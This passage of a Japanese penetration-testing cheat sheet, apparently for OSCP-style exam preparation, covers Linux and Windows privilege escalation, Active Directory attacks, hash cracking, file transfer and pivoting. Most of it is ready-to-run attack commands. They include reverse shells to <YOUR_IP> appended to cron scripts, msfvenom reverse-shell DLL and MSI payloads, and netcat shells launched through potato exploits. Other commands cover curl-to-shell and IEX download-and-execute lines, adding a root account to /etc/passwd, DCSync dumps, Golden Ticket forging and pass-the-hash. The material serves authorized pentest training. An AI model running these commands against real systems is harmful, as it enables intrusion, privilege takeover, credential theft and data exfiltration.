find / -perm -4000 -type f 2>/dev/null

# GUID ファイル探索
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# GTFOBins で悪用方法確認: https://gtfobins.github.io/
# 主要なSUID悪用例

# bash
bash -p                        # SUID bash → root権限シェル

# find
find . -exec /bin/sh -p \; -quit

# vim / vi
vim -c ':!/bin/sh'
vi -c ':!/bin/sh'

# less / more
!/bin/sh  # less/more実行中に入力

# nano
nano → Ctrl+R → Ctrl+X → reset; sh 1>&0 2>&0

# cp（/etc/passwdを上書き）
openssl passwd -1 -salt hacker hacker123
echo "hacker:\$1\$hacker\$...HASH...:0:0:root:/root:/bin/bash" >> /etc/passwd

# nmap (古いバージョン)
nmap --interactive
!sh

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl
perl -e 'exec "/bin/sh";'

# awk
awk 'BEGIN {system("/bin/sh")}'
```

### 5.3 Cron ジョブ悪用

```bash
# cronジョブ確認
cat /etc/crontab
crontab -l
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/

# cronが実行するスクリプトの権限確認
# 書き込み可能なら → リバースシェルを追記

# ⭐ 書き込み可能スクリプトへのリバースシェル追記
echo "bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1" >> /path/to/cron_script.sh

# PATHハイジャック（cronが相対パスでコマンドを実行する場合）
# /etc/crontabのPATHに書き込み可能ディレクトリが先頭にある場合
echo '#!/bin/bash' > /tmp/vulnerable_cmd
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/vulnerable_cmd
chmod +x /tmp/vulnerable_cmd
# 次のcron実行後
/tmp/rootbash -p  # root権限shell
```

### 5.4 Writable /etc/passwd

```bash
# /etc/passwdが書き込み可能か確認
ls -la /etc/passwd

# ⭐ パスワードハッシュ生成
openssl passwd -1 -salt hacker password123
# または
python3 -c "import crypt; print(crypt.crypt('password123', '\$1\$hacker\$'))"

# rootユーザーを追加
echo 'hacker:$1$hacker$XXXXHASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# 切替
su hacker  # password123を入力
```

### 5.5 Linux Capabilities

```bash
# Capabilities 確認
getcap -r / 2>/dev/null

# 主な危険なCapabilities
# cap_setuid → プロセスのUID変更可能
# cap_net_raw → raw socket
# cap_sys_admin → 多数の管理操作

# python3 + cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# perl + cap_setuid
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# vim + cap_setuid
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'

# openssl + cap_net_raw
# ファイル読み取りに悪用
openssl enc -in /etc/shadow
```

### 5.6 NFS no_root_squash

```bash
# ターゲットの /etc/exports 確認
cat /etc/exports
# no_root_squash があれば攻撃可能

# 攻撃側（root権限で）
showmount -e <TARGET_IP>
mkdir /tmp/nfs
mount -t nfs <TARGET_IP>:/share /tmp/nfs

# SUID bash を作成
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

# ターゲット側
/tmp/rootbash -p  # root権限shell
```

### 5.7 カーネルエクスプロイト

```bash
# カーネルバージョン確認
uname -a
cat /proc/version

# 有名なカーネルエクスプロイト
# DirtyCow (CVE-2016-5195) - Linux 2.x/3.x/4.x
# Dirty Pipe (CVE-2022-0847) - Linux 5.8-5.16

searchsploit linux kernel privilege escalation
searchsploit linux 4.15 privilege escalation

# DirtyCow 例
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c
gcc -pthread pokemon.c -o pokemon -lcrypt
./pokemon
```

### 5.8 自動化ツール

```bash
# ⭐ LinPEAS（最も網羅的）
# 攻撃側でホスト
python3 -m http.server 80
# ターゲット側で取得・実行
curl http://<YOUR_IP>/linpeas.sh | sh
wget http://<YOUR_IP>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# linux-exploit-suggester
wget http://<YOUR_IP>/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# pspy（cronジョブ・プロセス監視）
./pspy64  # 64bit版
./pspy32  # 32bit版
```

---

## 6. 権限昇格 - Windows

### 6.1 初期確認チェックリスト

```powershell
# ⭐ ユーザー・権限確認
whoami
whoami /all                    # 権限・グループ詳細（SeImpersonateなど確認）
whoami /priv
net user <username>            # ユーザー詳細

# システム情報
systeminfo                     # OS・パッチ適用状況
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname

# ネットワーク
ipconfig /all
netstat -ano                   # リスニングポート・接続
route print
arp -a

# プロセス・サービス
tasklist /SVC                  # プロセス一覧
net start                      # 動作中サービス
sc query                       # サービス一覧
wmic service get name,displayname,pathname,startmode  # サービス詳細（Unquoted Path確認）

# インストール済みソフト
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s

# スケジュールタスク
schtasks /query /fo LIST /v

# ホットフィックス（パッチ適用状況）
wmic qfe get Caption,Description,HotFixID,InstalledOn
systeminfo | findstr /i "hotfix"

# ファイル探索
dir /a C:\Users\
dir /a %USERPROFILE%
dir /s /a:h C:\  # 隠しファイル
findstr /si password *.txt *.ini *.config *.xml 2>nul

# レジストリからパスワード探索
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul
```

### 6.2 サービス系攻撃

#### 弱いサービス権限

```powershell
# ⭐ サービス権限確認
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv "Everyone" * /accepteula

# PowerSploit/PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableServiceFile
Get-UnquotedService

# サービスのバイナリパスを変更
sc config <SERVICENAME> binpath= "C:\path\to\malicious.exe"
sc stop <SERVICENAME>
sc start <SERVICENAME>

# または net user でadmin追加
sc config <SERVICENAME> binpath= "net localgroup administrators hacker /add"
sc stop <SERVICENAME>
sc start <SERVICENAME>
```

#### Unquoted Service Path

```powershell
# スペースを含み、クォートされていないパスを探す
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# 例: C:\Program Files\My App\service.exe
# Windowsは以下の順で実行を試みる:
# C:\Program.exe
# C:\Program Files\My.exe
# C:\Program Files\My App\service.exe

# 書き込み可能な場所に悪意のある実行ファイルを配置
icacls "C:\Program Files\My App" /t  # 権限確認
# 書き込み可能なら
copy shell.exe "C:\Program Files\My.exe"
sc stop <SERVICE>
sc start <SERVICE>
```

#### DLL Hijacking

```powershell
# Process Monitorでサービスが読み込もうとするDLLを特定
# 存在しないDLLを書き込み可能な場所に配置

# msfvenomでDLL生成
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o hijack.dll

# Process Monitorフィルタ設定:
# Result = NAME NOT FOUND
# Path ends with .dll
```

### 6.3 レジストリ悪用

```powershell
# ⭐ AlwaysInstallElevated確認（MSI を SYSTEM で実行）
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# 両方 1 なら悪用可能

# 悪意のある MSI 生成
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi -o shell.msi
# ターゲット側で実行
msiexec /quiet /qn /i C:\shell.msi

# Autorun レジストリ
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
# 書き込み権限があれば悪意のあるパスに変更
```

### 6.4 トークン操作（SeImpersonate）

```powershell
# whoami /priv で SeImpersonatePrivilege または SeAssignPrimaryTokenPrivilege を確認

# ⭐ PrintSpoofer（Windows 10 / Server 2016,2019向け）
PrintSpoofer.exe -i -c cmd       # インタラクティブ
PrintSpoofer.exe -c "nc.exe <IP> 4444 -e cmd"

# ⭐ RoguePotato（Windows 10 / Server 2019向け）
RoguePotato.exe -r <YOUR_IP> -e "cmd.exe /c nc.exe <YOUR_IP> 4444 -e cmd"

# JuicyPotato（古いWindowsServer向け - Server 2008/2012/2016）
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <YOUR_IP> 4444 -e cmd" -t *
# CLSID一覧: https://github.com/ohpe/juicy-potato/tree/master/CLSID

# GodPotato（最新の万能版）
GodPotato.exe -cmd "cmd /c nc.exe <YOUR_IP> 4444 -e cmd"
```

### 6.5 自動化ツール

```powershell
# ⭐ WinPEAS（最も網羅的）
.\winPEAS.exe
.\winPEAS.exe fast         # 高速モード
.\winPEAS.exe services     # サービスのみ

# PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# Seatbelt（情報収集特化）
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=system
.\Seatbelt.exe DotNet       # .NETバージョン

# Windows Exploit Suggester (攻撃側)
# systeminfo の出力をファイルに保存
systeminfo > sysinfo.txt
# 攻撃側で実行
python windows-exploit-suggester.py --database 2021-08-01-mssb.xls --systeminfo sysinfo.txt
```

---

## 7. Active Directory 攻撃

### 7.1 初期列挙

#### BloodHound / SharpHound

```powershell
# ⭐ SharpHound でデータ収集
.\SharpHound.exe -c all
.\SharpHound.exe -c all --stealth   # ステルスモード
.\SharpHound.exe -c all -d domain.local --ldapusername user --ldappassword pass

# Python版（ドメイン外から）
bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c all

# 収集したzipファイルをBloodHoundにインポート
# BloodHound起動後、zipをドラッグ&ドロップ

# 重要なBloodHoundクエリ（事前定義）
# - Find all Domain Admins
# - Find Shortest Path to Domain Admins
# - Find Principals with DCSync Rights
# - Find AS-REP Roastable Users
# - Find Kerberoastable Users
```

#### PowerView 列挙

```powershell
# PowerView ロード
Import-Module .\PowerView.ps1
# または
powershell -ep bypass -c "Import-Module .\PowerView.ps1; <COMMAND>"

# ⭐ ドメイン基本情報
Get-Domain
Get-DomainController
Get-DomainPolicy

# ユーザー列挙
Get-DomainUser | select samaccountname,description
Get-DomainUser -SPN                    # Kerberoastable ユーザー
Get-DomainUser -PreauthNotRequired     # AS-REP Roastable ユーザー

# グループ列挙
Get-DomainGroup | select name
Get-DomainGroupMember "Domain Admins" | select MemberName
Get-DomainGroupMember "Remote Desktop Users" | select MemberName

# コンピューター列挙
Get-DomainComputer | select dnshostname,operatingsystem
Get-DomainComputer -Ping               # 応答するものだけ

# ⭐ ACL 確認（重要）
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN,ActiveDirectoryRights,SecurityIdentifier

# GPO 列挙
Get-GPO -All
Get-DomainGPO | select displayname,gpcfilesyspath

# 信頼関係
Get-DomainTrust
Get-ForestTrust

# ローカル管理者を持つユーザー探索（時間がかかる）
Find-LocalAdminAccess
```

#### ldapdomaindump

```bash
# ドメイン外からLDAP列挙
ldapdomaindump <DC_IP> -u 'domain\user' -p 'password' -o ./ldapdump
# 結果: users.json, groups.json, computers.json など
```

---

### 7.2 認証攻撃

#### Password Spraying

```bash
# ⭐ CrackMapExec でスプレー
crackmapexec smb <DC_IP> -u users.txt -p 'Password123!' --continue-on-success
crackmapexec smb <DC_IP> -u users.txt -p passwords.txt --no-bruteforce  # 1ユーザー1パスワード

# kerbrute（ドメイン外から/ロックアウトに注意）
kerbrute passwordspray -d domain.local --dc <DC_IP> users.txt 'Password123!'
kerbrute userenum -d domain.local --dc <DC_IP> users.txt  # ユーザー有無確認

# ロックアウトポリシー確認（事前に必ず確認！）
crackmapexec smb <DC_IP> --pass-pol
net accounts /domain
```

#### AS-REP Roasting

```bash
# ⭐ 事前認証不要なユーザーのハッシュ取得
# ドメイン外から（ユーザーリストが必要）
python3 GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -outputfile asrep.txt

# ドメインユーザーとして（全ユーザーを自動検索）
python3 GetNPUsers.py domain.local/user:password -dc-ip <DC_IP> -outputfile asrep.txt

# PowerView（Windows から）
Get-DomainUser -PreauthNotRequired | Get-ASREPHash -Verbose

# ハッシュクラック
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

#### Kerberoasting

```bash
# ⭐ SPNを持つサービスアカウントのTGSハッシュ取得
# Impacket（ドメイン外から）
python3 GetUserSPNs.py domain.local/user:password -dc-ip <DC_IP> -request -outputfile kerberoast.txt

# PowerView（Windows から）
Get-DomainSPNTicket -SPN "MSSQLSvc/server.domain.local" | fl Hash

# Rubeus（Windows から）
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# ハッシュクラック
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

#### Pass-the-Hash (PtH)

```bash
# ⭐ CrackMapExec（NTLMハッシュで認証）
crackmapexec smb <IP> -u administrator -H <NTLM_HASH>
crackmapexec smb <IP/RANGE> -u administrator -H <NTLM_HASH> --local-auth  # ローカル認証

# コマンド実行
crackmapexec smb <IP> -u administrator -H <NTLM_HASH> -x "whoami"

# Evil-WinRM（WinRM対応の場合）
evil-winrm -i <IP> -u administrator -H <NTLM_HASH>

# psexec.py
python3 psexec.py domain/administrator@<IP> -hashes :<NTLM_HASH>

# wmiexec.py
python3 wmiexec.py domain/administrator@<IP> -hashes :<NTLM_HASH>

# smbexec.py
python3 smbexec.py domain/administrator@<IP> -hashes :<NTLM_HASH>
```

#### Pass-the-Ticket (PtT)

```powershell
# Rubeus でチケット取得
.\Rubeus.exe dump /service:krbtgt  # TGT取得
.\Rubeus.exe dump /luid:0x12345    # 特定セッションのチケット

# Mimikatz
sekurlsa::tickets /export           # チケットをファイルに保存

# チケットのインポート
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
mimikatz # kerberos::ptt <TICKET_FILE>

# 確認
klist
```

#### Overpass-the-Hash / Pass-the-Key

```powershell
# Mimikatz（NTLMハッシュからKerberosチケット生成）
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<HASH> /run:cmd

# Rubeus
.\Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /domain:domain.local /dc:<DC_IP> /ptt
```

---

### 7.3 ドメイン内横移動・昇格

#### DCSync 攻撃

```bash
# ⭐ Impacket secretsdump（ドメイン外から）
python3 secretsdump.py domain/user:password@<DC_IP>
python3 secretsdump.py domain/administrator@<DC_IP> -hashes :<NTLM_HASH>

# ダンプ対象の絞り込み
python3 secretsdump.py domain/user:password@<DC_IP> -just-dc-user administrator
python3 secretsdump.py domain/user:password@<DC_IP> -just-dc-ntlm

# Mimikatz（Windows から）
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv

# DCSync権限のチェック（GenericAll/WriteDACL等がDomain Admins以外に付与）
Get-DomainObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|ExtendedRight"}
```

#### Golden Ticket

```bash
# 事前に必要な情報
# 1. krbtgt NTLMハッシュ (secretsdumpで取得)
# 2. ドメインSID

# ドメインSID確認
python3 getPac.py domain.local/user:pass -targetUser administrator
# または PowerShell
Get-DomainSID

# ⭐ Impacket ticketer
python3 ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain domain.local administrator
export KRB5CCNAME=administrator.ccache
python3 psexec.py domain.local/administrator@<DC_IP> -k -no-pass

# Mimikatz
kerberos::golden /user:Administrator /domain:domain.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /id:500 /ptt
```

#### Silver Ticket

```bash
# サービスのNTLMハッシュが必要（secretsdumpで取得）
# Golden Ticketより検出されにくい

python3 ticketer.py -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain domain.local -spn MSSQLSvc/server.domain.local administrator
```

#### ACL 悪用

```powershell
# ⭐ 主要なACL権限と悪用方法

# GenericAll / FullControl → パスワードリセット可能
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

# ForceChangePassword
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)

# WriteDACL → 自分にDCSync権限を付与
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity myuser -Rights DCSync

# GenericWrite → SPN設定（Kerberoastingへ）
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
Get-DomainSPNTicket -SPN 'fake/spn' | fl Hash

# WriteOwner → 所有者変更後にACL操作
Set-DomainObjectOwner -Identity targetgroup -OwnerIdentity myuser
Add-DomainObjectAcl -TargetIdentity targetgroup -PrincipalIdentity myuser -Rights All
```

#### LAPS 読み取り

```powershell
# LAPSが有効か確認
Get-ADObject 'CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=domain,DC=local'

# 読み取り権限があればパスワード取得
Get-DomainComputer -Filter {ms-Mcs-AdmPwdExpirationTime -like '*'} | select dnshostname,ms-Mcs-AdmPwd

# Crackmapexec
crackmapexec ldap <DC_IP> -u user -p pass --module laps
```

---

### 7.4 Impacket スクリプト集

| スクリプト | 用途 | 例 |
|-----------|------|-----|
| `psexec.py` | SYSTEM権限でリモート実行 | `psexec.py domain/user:pass@<IP>` |
| `wmiexec.py` | WMIでリモート実行（ファイルなし） | `wmiexec.py domain/user:pass@<IP>` |
| `smbexec.py` | SMB経由リモート実行 | `smbexec.py domain/user:pass@<IP>` |
| `secretsdump.py` | ハッシュ・秘密情報ダンプ | `secretsdump.py domain/user:pass@<IP>` |
| `GetNPUsers.py` | AS-REP Roasting | `GetNPUsers.py domain/ -usersfile u.txt -no-pass -dc-ip <DC>` |
| `GetUserSPNs.py` | Kerberoasting | `GetUserSPNs.py domain/user:pass -dc-ip <DC> -request` |
| `ticketer.py` | Golden/Silver Ticket生成 | `ticketer.py -nthash <HASH> -domain-sid <SID> -domain d.l user` |
| `atexec.py` | スケジュールタスクでリモート実行 | `atexec.py domain/user:pass@<IP> whoami` |
| `lookupsid.py` | SIDブルートフォース | `lookupsid.py domain/user:pass@<IP>` |
| `dcomexec.py` | DCOMでリモート実行 | `dcomexec.py domain/user:pass@<IP>` |
| `mssqlclient.py` | MSSQLクライアント | `mssqlclient.py domain/user:pass@<IP>` |
| `reg.py` | リモートレジストリ操作 | `reg.py domain/user:pass@<IP> query -keyName HKLM\\SOFTWARE` |

---

### 7.5 CrackMapExec チートシート

```bash
# ⭐ SMB 基本
crackmapexec smb <IP>
crackmapexec smb <IP/RANGE>
crackmapexec smb <IP> -u user -p pass
crackmapexec smb <IP> -u user -H <HASH>           # PtH

# 列挙
crackmapexec smb <IP> -u user -p pass --shares     # 共有
crackmapexec smb <IP> -u user -p pass --users      # ユーザー
crackmapexec smb <IP> -u user -p pass --groups     # グループ
crackmapexec smb <IP> -u user -p pass --loggedon-users  # ログイン中ユーザー
crackmapexec smb <IP> -u user -p pass --sessions   # セッション
crackmapexec smb <IP> -u user -p pass --pass-pol   # パスワードポリシー
crackmapexec smb <IP> -u user -p pass --rid-brute  # RIDブルートフォース

# コマンド実行
crackmapexec smb <IP> -u user -p pass -x "whoami"  # cmd
crackmapexec smb <IP> -u user -p pass -X "whoami"  # PowerShell

# ファイル操作
crackmapexec smb <IP> -u user -p pass --get-file C:\path\file /local/path
crackmapexec smb <IP> -u user -p pass --put-file /local/file C:\path\file

# モジュール
crackmapexec smb <IP> -u user -p pass -M laps      # LAPS
crackmapexec smb <IP> -u user -p pass -M mimikatz  # Mimikatz実行
crackmapexec smb <IP> -u user -p pass -M rdp -o ACTION=enable  # RDP有効化

# WinRM
crackmapexec winrm <IP> -u user -p pass -x "whoami"

# LDAP
crackmapexec ldap <IP> -u user -p pass --kerberoasting kerberoast.txt
crackmapexec ldap <IP> -u user -p pass --asreproast asrep.txt
```

### 7.6 Evil-WinRM

```bash
# ⭐ 基本接続
evil-winrm -i <IP> -u administrator -p 'Password123!'
evil-winrm -i <IP> -u administrator -H <NTLM_HASH>  # PtH

# ファイル転送
# Evil-WinRM内で
upload /local/file C:\remote\file
download C:\remote\file /local/file

# PowerShellスクリプト読み込み
# -s でスクリプトディレクトリ指定
evil-winrm -i <IP> -u user -p pass -s /opt/powershell-scripts/
# 接続後
Invoke-AllChecks  # PowerUpスクリプトが使えれば

# SSL使用
evil-winrm -i <IP> -u user -p pass -S
```

---

## 8. パスワードクラック

### 8.1 Hashcat

```bash
# ⭐ ハッシュタイプ

# 主要なモード一覧
| モード | ハッシュタイプ |
|--------|--------------|
| -m 0   | MD5 |
| -m 100 | SHA1 |
| -m 1000 | NTLM |
| -m 5600 | Net-NTLMv2 (NTLMv2) |
| -m 5500 | Net-NTLMv1 (NTLMv1) |
| -m 13100 | Kerberos TGS (Kerberoast) |
| -m 18200 | Kerberos AS-REP (AS-REP Roast) |
| -m 1800 | sha512crypt ($6$) - Linux shadow |
| -m 500  | md5crypt ($1$) - Linux shadow |
| -m 3200 | bcrypt ($2*$) |
| -m 7500 | Kerberos 5 AS-REQ Pre-Auth |
| -m 1500 | DES (LM) |
| -m 2100 | DCC2 (Domain Cached Credentials 2) |

# 基本使用法
hashcat -m <MODE> <HASH_FILE> <WORDLIST>
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt

# ルール適用
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# マスク攻撃（ブルートフォース）
hashcat -m 1000 ntlm.txt -a 3 ?u?l?l?l?l?l?d?d  # 大文字+5小文字+2数字

# マスク文字
# ?l = 小文字 a-z
# ?u = 大文字 A-Z
# ?d = 数字 0-9
# ?s = 記号
# ?a = 全文字

# 組み合わせ攻撃
hashcat -m 1000 ntlm.txt -a 1 wordlist1.txt wordlist2.txt

# GPUを使用 (デフォルト)
hashcat -m 1000 ntlm.txt rockyou.txt -O   # 最適化オプション

# 結果確認
hashcat -m 1000 ntlm.txt --show
```

### 8.2 John the Ripper

```bash
# ⭐ 基本使用法
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# ハッシュタイプ指定
john --format=NT hash.txt --wordlist=rockyou.txt        # NTLM
john --format=sha512crypt shadow.txt --wordlist=rockyou.txt  # Linux shadow
john --format=krb5tgs kerberoast.txt --wordlist=rockyou.txt  # Kerberoast

# ハッシュ自動検出
john hash.txt

# ルール適用
john --wordlist=rockyou.txt --rules hash.txt

# /etc/shadow + /etc/passwd を結合してクラック
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt --wordlist=rockyou.txt

# 結果表示
john --show hash.txt

# SSH 秘密鍵クラック
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt

# ZIP クラック
zip2john secret.zip > zip.hash
john zip.hash --wordlist=rockyou.txt
```

### 8.3 ワードリスト

```bash
# 主要なワードリスト場所
/usr/share/wordlists/rockyou.txt             # 最もポピュラー（14M語）
/usr/share/seclists/Passwords/              # SecLists
/usr/share/seclists/Usernames/              # ユーザー名リスト

# rockyou.txt 解凍
gunzip /usr/share/wordlists/rockyou.txt.gz

# カスタムワードリスト生成
cewl http://<IP> -m 5 -w custom_wordlist.txt   # サイトから単語収集
crunch 8 10 abcdef123 -o wordlist.txt          # 文字列から生成
```

---

## 9. ファイル転送

### 9.1 Linux → Linux / Linux → Windows

```bash
# ⭐ Python HTTPサーバー（攻撃側）
python3 -m http.server 80
python2 -m SimpleHTTPServer 80

# ダウンロード（ターゲット側）
wget http://<YOUR_IP>/file
curl http://<YOUR_IP>/file -o file
curl http://<YOUR_IP>/file | bash  # ダウンロード＆実行

# SCP（SSHアクセスがある場合）
scp /local/file user@<TARGET_IP>:/remote/path/
scp user@<TARGET_IP>:/remote/file /local/path/

# Netcat ファイル転送
# 受信側
nc -nlvp 4444 > received_file
# 送信側
nc <IP> 4444 < file_to_send
```

### 9.2 Windows ターゲットへのファイル転送

```powershell
# ⭐ PowerShell
(New-Object Net.WebClient).DownloadFile('http://<IP>/file.exe', 'C:\file.exe')
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/script.ps1')
Invoke-WebRequest -Uri 'http://<IP>/file.exe' -OutFile 'C:\file.exe'
wget http://<IP>/file.exe -OutFile file.exe

# certutil（証明書ツールを悪用）
certutil.exe -urlcache -split -f http://<IP>/file.exe file.exe
certutil.exe -decode encoded.b64 decoded.exe  # Base64デコード

# bitsadmin
bitsadmin /transfer job /download /priority high http://<IP>/file.exe C:\file.exe

# SMBサーバー経由（攻撃側）
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./
# ターゲット側
copy \\<YOUR_IP>\share\file.exe C:\file.exe
net use Z: \\<YOUR_IP>\share
Z:
copy file.exe C:\file.exe

# SMBサーバー（認証あり）
python3 smbserver.py share . -smb2support -username user -password pass
# ターゲット側
net use Z: \\<IP>\share /user:user pass

# Base64 でエンコードして貼り付け（ファイアウォールがある場合）
# 攻撃側
base64 -w 0 file.exe > file.b64
cat file.b64  # コピーする

# ターゲット側 (PowerShell)
$b64 = "<PASTE_BASE64>"
[IO.File]::WriteAllBytes("C:\file.exe", [Convert]::FromBase64String($b64))
```

### 9.3 Windows からファイル取得

```powershell
# ⭐ PowerShell でアップロード
# 攻撃側で受信サーバー起動
python3 -c "
import http.server, socketserver, cgi

class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        ctype, _ = cgi.parse_header(self.headers['Content-Type'])
        if ctype == 'multipart/form-data':
            fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST'})
            f = fs['file']
            with open(f.filename, 'wb') as w: w.write(f.file.read())
        self.send_response(200); self.end_headers()

with socketserver.TCPServer(('', 8000), Handler) as httpd: httpd.serve_forever()
"

# ターゲット側
Invoke-RestMethod -Uri 'http://<YOUR_IP>:8000/' -Method POST -InFile 'C:\sensitive\file.txt' -ContentType 'multipart/form-data'
```

---

## 10. ピボット・トンネリング

### 10.1 SSH トンネリング

```bash
# ⭐ ローカルポートフォワーディング
# 自分の localhost:8080 → ターゲット経由で 内部IP:80 に転送
ssh -L 8080:internal_host:80 user@pivot_host -N
# アクセス: http://localhost:8080

# ⭐ ダイナミックポートフォワーディング（SOCKSプロキシ）
# 自分の 1080番ポートをSOCKSプロキシとして内部ネットワークを探索
ssh -D 1080 user@pivot_host -N
# proxychains.conf に socks5 127.0.0.1 1080 を追記
proxychains nmap -sT -p 80,443,445 192.168.2.0/24

# リモートポートフォワーディング
# ターゲットのリスナーを自分の ポートに転送（リバース）
ssh -R 4444:localhost:4444 user@your_vps -N
```

### 10.2 Chisel

```bash
# ⭐ セットアップ
# 攻撃側（サーバー）
./chisel server -p 8000 --reverse

# ターゲット側（クライアント）- リバース SOCKSプロキシ
./chisel client <YOUR_IP>:8000 R:socks

# 特定ポートフォワード
./chisel client <YOUR_IP>:8000 R:1080:socks
./chisel client <YOUR_IP>:8000 R:8888:192.168.2.100:80

# proxychains.conf
# socks5 127.0.0.1 1080
proxychains nmap -sT 192.168.2.0/24
```

### 10.3 Ligolo-ng

```bash
# ⭐ 次世代ピボットツール（chiselより高速）
# 攻撃側: プロキシサーバー起動
./proxy -selfcert -laddr 0.0.0.0:11601

# ターゲット側: エージェント起動
./agent -connect <YOUR_IP>:11601 -ignore-cert

# proxy側の操作
session          # セッション選択
start            # トンネル開始

# 攻撃側にルート追加（内部ネットワークへ）
sudo ip route add 192.168.2.0/24 dev ligolo
```

### 10.4 Proxychains

```bash
# /etc/proxychains4.conf の設定
# tail部分に追記
socks5 127.0.0.1 1080   # chisel/SSHのSOCKS

# 使用法
proxychains nmap -sT -p 80,443,445,22 192.168.2.0/24
proxychains python3 GetNPUsers.py domain.local/ -dc-ip 192.168.2.1
proxychains evil-winrm -i 192.168.2.10 -u administrator -p pass
proxychains crackmapexec smb 192.168.2.0/24 -u user -p pass
```

### 10.5 Socat リレー

```bash
# ポートリレー（中継点で使用）
socat TCP-LISTEN:4444,fork TCP:<NEXT_HOP>:4444

# リバースシェルリレー
# 中継点で
socat TCP-LISTEN:4444,fork TCP:<YOUR_IP>:4444 &
# ターゲットでリバースシェル → 中継点:4444
```

---

## 11. レポート作成

### 11.1 記録すべき情報

```
各ステップで必ず記録:
├── タイムスタンプ（コマンド実行時刻）
├── 使用したコマンド（完全なコマンドライン）
├── ターゲットIPアドレス・ホスト名
├── 発見した脆弱性・設定ミス
├── エクスプロイト手順（再現可能な詳細）
├── 取得した証拠（proof.txt の内容）
└── スクリーンショット
```

### 11.2 proof.txt 取得

```bash
# Linux
cat /root/proof.txt
cat /root/local.txt
hostname && whoami && cat /root/proof.txt && ip a

# Windows
type C:\Users\Administrator\Desktop\proof.txt
type C:\Documents and Settings\Administrator\Desktop\proof.txt
hostname && whoami && type C:\Users\Administrator\Desktop\proof.txt && ipconfig
```

### 11.3 スクリーンショット命名規則

```
<IP>_<サービス/脆弱性>_<ステップ>.png

例:
192.168.1.10_nmap_scan.png
192.168.1.10_smb_eternalblue_exploit.png
192.168.1.10_privesc_suid_bash.png
192.168.1.10_proof.png
```

### 11.4 ログ記録コマンド

```bash
# ⭐ script コマンドで全操作を記録
script -a /tmp/pentest_192.168.1.10.log
# 終了
exit

# tmux で自動ログ
# ~/.tmux.conf に追記
